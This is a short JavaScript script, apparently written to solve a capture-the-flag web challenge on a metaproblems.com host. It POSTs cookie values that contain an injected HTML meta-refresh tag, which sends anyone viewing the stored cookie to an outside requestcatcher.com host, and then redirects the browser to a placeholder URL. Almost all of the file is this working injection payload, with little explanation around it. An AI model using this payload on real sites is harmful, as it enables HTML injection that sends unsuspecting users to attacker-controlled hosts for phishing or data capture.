// Function to make a POST request with fetch
async function makePostRequest(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(data).toString()
    });
    return await response.json();
}

// Function to set cookies and redirect
async function setCookiesAndRedirect() {
    const metaCookiesParts = [
        'a=<meta ',
        ' http-equiv="refresh" ',
        ' content="0; ',
        ' url=https://hi.requestcatcher.com/">'
    ];

    const url = 'http://host3.metaproblems.com:6020/index.php';
    const numRequests = 4;
    const requests = [];

    // Loop to create requests
    for (let i = 0; i < numRequests; i++) {
        const data = {
            cookie_name: `cookie_${i + 1}`,
            cookie_value: metaCookiesParts.join('')
        };
        requests.push(makePostRequest(url, data));
    }

    try {
        // Perform all requests concurrently using Promise.all
        const responses = await Promise.all(requests);
        responses.forEach((response, index) => {
            console.log(`Cookie ${index + 1} set: ${response}`);
        });

        // Redirect to view cookie URL after setting cookies (assuming all requests succeeded)
        window.location.href = 'view_cookie_url'; // Replace with actual URL
    } catch (error) {
        console.error('Error setting cookies:', error);
    }
}
